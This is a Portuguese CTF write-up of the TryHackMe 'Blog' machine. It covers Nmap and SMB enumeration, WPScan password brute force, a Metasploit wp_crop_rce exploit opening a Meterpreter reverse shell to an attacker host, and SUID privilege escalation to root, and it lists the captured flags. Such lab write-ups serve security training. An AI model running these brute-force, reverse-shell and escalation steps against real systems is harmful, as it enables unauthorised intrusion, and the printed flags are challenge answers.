# 🔍 Blog — CTF Writeup
### TryHackMe | WordPress Exploitation · SMB Enumeration · SUID Privilege Escalation

---

| **Analista**          | Mauricio Robert                                                                                  |
|-----------------------|--------------------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                                |
| **Data do Relatório** | 02/07/2026                                                                                       |
| **Data do Teste**     | 01–02/07/2026                                                                                     |
| **Classificação**     | CONFIDENCIAL                                                                                       |
| **Alvo**              | `blog.thm` (10.66.152.41)                                                                          |
| **Ferramentas**       | Nmap · WPScan · Gobuster · smbclient · Metasploit · strings     |
| **Plataforma**        | TryHackMe — Blog Room                                                                              |

---

## 🔍 Resumo Executivo

Este writeup documenta o teste de penetração realizado contra a máquina **Blog** da plataforma TryHackMe. O alvo consiste em um servidor **Ubuntu Linux** (`10.66.152.41` / `blog.thm`) executando um blog **WordPress 5.0** vulnerável, com serviços adicionais de **SSH** (OpenSSH 7.6p1) e **Samba** (4.7.6-Ubuntu) expostos.

A metodologia seguiu as etapas clássicas de pentest: **reconhecimento** com Nmap e Gobuster, **enumeração** do CMS com WPScan e dos compartilhamentos com smbclient, **acesso inicial** via brute force de credenciais WordPress (`kwheel:cutiepie1`), **exploração** de RCE através da vulnerabilidade `wp_crop_rce` no Metasploit, e **escalonamento de privilégios** para root por meio de um binário SUID personalizado (`/usr/sbin/checker`) que falha na verificação da variável de ambiente `admin` e chama `setuid(0)` seguido de `/bin/bash`.

Ao final do teste foram recuperadas as flags: a **user flag**, localizada de forma não convencional em `/media/usb/user.txt` (`c8421899aae571f7af486492b71a8ab7`), e a **root flag** em `/root/root.txt` (`9a0b2b618bef9bfa7ac28c1353d9f318`).

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                 | Finalidade                                                                                     |
|-----------------------------|-------------------------------------------------------------------------------------------------|
| **Nmap**               | Varredura de portas e detecção de serviços/SO do alvo `10.66.152.41`                            |
| **WPScan**                  | Enumeração de CMS WordPress — versão, temas, usuários e brute force de senhas                   |
| **Gobuster**         | Enumeração de diretórios e arquivos no servidor HTTP (`blog.thm`)                                |
| **smbclient**                | Enumeração e acesso a compartilhamentos Samba do alvo                                            |
| **Metasploit**| Exploração de RCE no WordPress via upload de imagem                                              |
| **strings**        | Análise do binário SUID `/usr/sbin/checker` para escalonamento de privilégios                    |

---

## ⛓ Fluxo do Ataque

```
[FASE 1 — RECONHECIMENTO]
    Nmap -A -sV → 10.66.152.41
    Portas: 22 (SSH), 80 (HTTP/WordPress), 139 e 445 (Samba)
    ↓
[FASE 2 — ENUMERAÇÃO WEB]
    robots.txt → Disallow: /wp-admin/
    Gobuster → wp-login.php, wp-admin, wp-config.php, xmlrpc.php
    ↓
[FASE 3 — ENUMERAÇÃO SMB]
    smbclient -L //10.66.152.41/ -N → BillySMB (sem senha)
    Download: Alice-White-Rabbit.jpg, tswift.mp4, check-this.png
    ↓
[FASE 4 — ENUMERAÇÃO WORDPRESS (WPScan)]
    WordPress 5.0 (Insecure) | Tema: twentytwenty
    Usuários: kwheel, bjoel, Karen Wheeler, Billy Joel
    ↓
[FASE 5 — ACESSO INICIAL (Brute Force)]
    WPScan -U kwheel,bjoel -P rockyou.txt
    [SUCCESS] kwheel / cutiepie1
    ↓
[FASE 6 — EXPLORAÇÃO (RCE)]
    Metasploit exploit/multi/http/wp_crop_rce
    kwheel:cutiepie1 → Meterpreter session opened
    ↓
[FASE 7 — ESCALONAMENTO DE PRIVILÉGIO]
    find / -perm -u=s -type f → /usr/sbin/checker
    strings/ltrace → getenv("admin") → setuid(0) → /bin/bash
    export admin=1 && /usr/sbin/checker → whoami: root
    ↓
[FASE 8 — CAPTURA DAS FLAGS]
    user.txt (falso) em /home/bjoel/ → "TRY HARDER"
    user.txt real em /media/usb/ → c8421899aae571f7af486492b71a8ab7
    root.txt em /root/ → 9a0b2b618bef9bfa7ac28c1353d9f318
```

---

## 📋 Fases Detalhadas

### Fase 1 — Reconhecimento (Nmap)

A varredura Nmap completa (`-A -sV`) contra o alvo `10.66.152.41` identificou 4 portas abertas:

| Porta / Protocolo | Serviço / Versão                                                        |
|--------------------|--------------------------------------------------------------------------|
| 22/tcp             | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3                                          |
| 80/tcp             | Apache httpd 2.4.29 (Ubuntu) — WordPress 5.0 (Billy Joel's IT Blog)      |
| 139/tcp            | Samba smbd 3.X–4.X (workgroup: WORKGROUP)                                |
| 445/tcp            | Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP, message signing disabled) |

Informações adicionais: `http-generator: WordPress 5.0`; `http-robots.txt: 1 disallowed entry — /wp-admin/`; `smb-os-discovery: OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: blog | FQDN: blog`.

![Nmap Result](/CTFs/Blog/images/Nmap_Result.png)
*Figura 1 — Nmap exibindo as 4 portas abertas: 22 (SSH), 80 (HTTP/WordPress), 139 e 445 (Samba), além do banner do blog "Billy Joel's IT Blog".*

---

### Fase 2 — Enumeração Web

**2.1 — robots.txt**

O acesso a `http://blog.thm/robots.txt` revelou a diretiva de exclusão de robôs para o painel administrativo:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

![robots.txt](/CTFs/Blog/images/robots.txt.png)
*Figura 2 — robots.txt de blog.thm exibindo a diretiva `Disallow: /wp-admin/`.*

**2.2 — Enumeração SMB (smbclient)**

A enumeração dos compartilhamentos SMB sem autenticação revelou dois compartilhamentos:

```
smbclient -L //10.66.152.41/ -N

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
BillySMB        Disk      Billy's local SMB Share
IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
```

O compartilhamento **BillySMB** foi acessado sem senha, revelando 3 arquivos:

- `Alice-White-Rabbit.jpg` (33.378 bytes)
- `tswift.mp4` (1.236.733 bytes)
- `check-this.png` (3.082 bytes)

Todos os três arquivos foram baixados para análise. O compartilhamento `print$` retornou `NT_STATUS_ACCESS_DENIED`.

![smbclient](/CTFs/Blog/images/SmbClient.png)
*Figura 3 — smbclient listando BillySMB e realizando o download de Alice-White-Rabbit.jpg, tswift.mp4 e check-this.png.*

---

### Fase 3 — Enumeração WordPress com WPScan

**3.1 — CMS e Versão**

O WPScan identificou com alta confiança o WordPress versão 5.0, o tema **twentytwenty** (versão 1.3, desatualizado) e enumerou 4 usuários via *Author Posts Pattern* e *RSS Generator*:

| Username        | Nome Completo / Método de Detecção                          |
|------------------|---------------------------------------------------------------|
| `kwheel`         | Karen Wheeler — RSS Generator (Passive Detection)              |
| `bjoel`          | Billy Joel — Author Posts Pattern (Passive Detection)          |
| `Karen Wheeler`  | RSS Generator (Passive Detection)                              |
| `Billy Joel`     | RSS Generator (Passive Detection)                               |

![CMS e Versão](/CTFs/Blog/images/CMS_and_Version.png)
*Figura 4 — WPScan identificando WordPress 5.0 (Insecure), tema twentytwenty (v1.3) e os 4 usuários enumerados (kwheel, bjoel, Karen Wheeler, Billy Joel).*

**3.2 — Brute Force de Credenciais WordPress**

Com os usuários enumerados, foi executado brute force contra o `wp-login.php`:

```
wpscan --url http://blog.thm/ -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt
```

Após 2.865 tentativas (00:03:24), a credencial válida foi encontrada:

```
[SUCCESS] - kwheel / cutiepie1
[!] Valid Combinations Found:
| Username: kwheel, Password: cutiepie1
```

![Brute Force WPScan](/CTFs/Blog/images/BruteForceWPScan.png)
*Figura 5 — WPScan realizando brute force e encontrando a combinação válida `kwheel / cutiepie1`.*

O login com as credenciais foi confirmado diretamente no painel administrativo do WordPress:

![Usuários / Dashboard WordPress](/CTFs/Blog/images/Users_WordPress.png)
*Figura 6 — Dashboard do WordPress logado como Karen Wheeler (kwheel), confirmando o acesso obtido via brute force.*

---

### Fase 4 — Exploração (WordPress `wp_crop_rce` / Meterpreter)

Com credenciais válidas, foi utilizado o módulo Metasploit `exploit/multi/http/wp_crop_rce`, que explora a funcionalidade de corte (*crop*) de imagens do WordPress para upload de um arquivo PHP malicioso e obtenção de execução remota de código (RCE):

| Parâmetro Metasploit | Valor Configurado                  |
|------------------------|--------------------------------------|
| MODULE                 | `exploit/multi/http/wp_crop_rce`     |
| RHOSTS                 | `10.66.152.41`                       |
| RPORT                  | `80`                                  |
| USERNAME               | `kwheel`                              |
| PASSWORD               | `cutiepie1`                           |
| LHOST                  | `192.168.141.198`                     |
| LPORT                  | `4444`                                |
| PAYLOAD                | `php/meterpreter/reverse_tcp`         |

A exploração foi executada com sucesso, abrindo uma sessão Meterpreter:

```
[*] Started reverse TCP handler on 192.168.141.198:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload... Uploading payload... Image uploaded
[*] Sending stage (45739 bytes) to 10.66.152.41
[*] Meterpreter session 1 opened (192.168.141.198:4444 -> 10.66.152.41:44966) at 2026-07-02 00:05:33 -0300
meterpreter >
```

![Exploit e RCE](/CTFs/Blog/images/Exploit_and_RCE.png)
*Figura 7 — Metasploit `wp_crop_rce` abrindo sessão Meterpreter (192.168.141.198:4444 -> 10.66.152.41:44966).*

---

### Fase 5 — Escalonamento de Privilégios (SUID `/usr/sbin/checker`)

**5.1 — Enumeração de Binários SUID**

Após a sessão Meterpreter, a busca por binários com bit SUID configurado revelou o binário personalizado `/usr/sbin/checker`:

```
find / -perm -u=s -type f 2>/dev/null
...
/usr/sbin/checker
```

A análise com `strings`/`ltrace` revelou que o programa verifica a variável de ambiente `admin` e, se não definida, imprime "Not an Admin" e encerra. Se a variável existir, executa `setuid(0)` seguido de `/bin/bash` — fornecendo um shell root:

```
strings /usr/sbin/checker
setuid
system
getenv
admin          <- variável de ambiente verificada
/bin/bash      <- executado após setuid(0)
Not an Admin   <- mensagem sem a variável
```

![Enumeração de Privilégio](/CTFs/Blog/images/Privilege_Enum.png)
*Figura 8 — `strings /usr/sbin/checker` revelando a verificação de `getenv("admin")`, `setuid(0)` e chamada a `/bin/bash`.*

**5.2 — Execução do Escalonamento**

Com a lógica do binário compreendida, o escalonamento foi executado em um único comando:

```
export admin=1
/usr/sbin/checker
whoami
root
```

![Escalonamento de Privilégio](/CTFs/Blog/images/Privilage_Escalation.png)
*Figura 9 — `export admin=1 && /usr/sbin/checker` elevando o acesso para root — `whoami` retorna "root".*

---

### Fase 6 — Captura das Flags

O arquivo `user.txt` no diretório padrão `/home/bjoel/` continha uma mensagem de engano:

```
cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

A busca recursiva pelo sistema de arquivos localizou o `user.txt` real em uma localização não convencional:

```
find / -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt   <- flag real

cd /media/usb/
cat user.txt
c8421899aae571f7af486492b71a8ab7
```

Com o acesso root obtido via SUID, a root flag foi recuperada diretamente:

```
cd root
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
```

![User Flag e Root Flag](/CTFs/Blog/images/user(flag)_root(flag).png)
*Figura 10 — Terminal exibindo a descoberta do `user.txt` real em `/media/usb/` (`c8421899aae571f7af486492b71a8ab7`) e do `root.txt` em `/root/` (`9a0b2b618bef9bfa7ac28c1353d9f318`).*

---

## 🗺 Mapeamento Investigativo

| Etapa | Fonte de Evidência                                | Artefato / Resultado                                    |
|-------|------------------------------------------------------|-------------------------------------------------------------|
| Portas abertas             | Nmap -A -sV                             | 22/SSH, 80/HTTP, 139 e 445/Samba                             |
| Diretiva robots.txt        | Navegador → `blog.thm/robots.txt`       | `Disallow: /wp-admin/`                                        |
| Compartilhamento SMB anônimo | smbclient -L                          | `BillySMB` (sem senha)                                        |
| Versão do CMS               | WPScan                                  | WordPress 5.0 / tema twentytwenty v1.3                        |
| Usuários enumerados          | WPScan                                  | kwheel, bjoel, Karen Wheeler, Billy Joel                      |
| Credencial válida            | WPScan brute force                      | `kwheel : cutiepie1`                                           |
| Vetor de RCE                 | Metasploit                              | `wp_crop_rce`                                                  |
| Sessão obtida                 | Metasploit                             | Meterpreter (192.168.141.198:4444 -> 10.66.152.41)             |
| Binário SUID vulnerável       | `find / -perm -u=s`                    | `/usr/sbin/checker`                                             |
| Técnica de escalonamento      | strings/ltrace                         | `getenv("admin")` → `setuid(0)` → `/bin/bash`                  |
| User flag                     | `/media/usb/user.txt`                  | `c8421899aae571f7af486492b71a8ab7`                              |
| Root flag                     | `/root/root.txt`                       | `9a0b2b618bef9bfa7ac28c1353d9f318`                              |

---

## 🚨 Artefatos e Indicadores Identificados (IOCs)

| Tipo                     | Indicador                              | Contexto                                                       |
|----------------------------|-------------------------------------------|--------------------------------------------------------------------|
| IP / Host alvo              | `10.66.152.41` (`blog.thm`)               | Servidor Ubuntu com Apache/WordPress e Samba                        |
| CMS vulnerável               | WordPress 5.0 (2018-12-06)                | Desatualizado — vulnerável a `wp_crop_rce`                          |
| Tema desatualizado           | twentytwenty v1.3                          | Última versão disponível: 3.1                                        |
| Compartilhamento anônimo      | `BillySMB`                                | Acesso sem autenticação — 3 arquivos expostos                        |
| Credencial WordPress          | `kwheel : cutiepie1`                       | Obtida via brute force (WPScan / rockyou.txt)                        |
| Módulo de exploração           | `exploit/multi/http/wp_crop_rce`          | Upload de payload PHP malicioso via crop de imagem                    |
| Payload                       | `php/meterpreter/reverse_tcp`              | 192.168.141.198:4444                                                  |
| Binário SUID inseguro          | `/usr/sbin/checker`                       | `setuid(0)` condicionado à variável de ambiente `admin`               |
| User flag                      | `c8421899aae571f7af486492b71a8ab7`         | `/media/usb/user.txt`                                                  |
| Root flag                      | `9a0b2b618bef9bfa7ac28c1353d9f318`         | `/root/root.txt`                                                       |
| Técnica (MITRE ATT&CK)         | `T1046`                                    | Network Service Scanning (Nmap)                                        |
| Técnica (MITRE ATT&CK)         | `T1110.001`                                | Brute Force: Password Guessing (WPScan)                                |
| Técnica (MITRE ATT&CK)         | `T1505.003`                                | Web Shell (upload via wp_crop_rce)                                     |
| Técnica (MITRE ATT&CK)         | `T1548.001`                                | Setuid and Setgid (`/usr/sbin/checker`)                                |

---

## ✅ Resumo das Flags

| # | Descrição              | Flag / Valor                             |
|---|--------------------------|---------------------------------------------|
| 1 | User Flag                | `c8421899aae571f7af486492b71a8ab7`           |
| 2 | Root Flag                | `9a0b2b618bef9bfa7ac28c1353d9f318`           |

---

## 📚 Referências

- [TryHackMe — Blog Room](https://tryhackme.com/room/blog)
- [WPScan — WordPress Security Scanner](https://wpscan.com/)
- [Metasploit — wp_crop_rce module](https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/)
- [CWE-807 — Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
- [MITRE ATT&CK — T1548.001 Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)
- [MITRE ATT&CK — T1505.003 Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [Gobuster](https://github.com/OJ/gobuster)
- [Nmap](https://nmap.org/)
- [WordPress Security Best Practices](https://wordpress.org/documentation/article/hardening-wordpress/)

---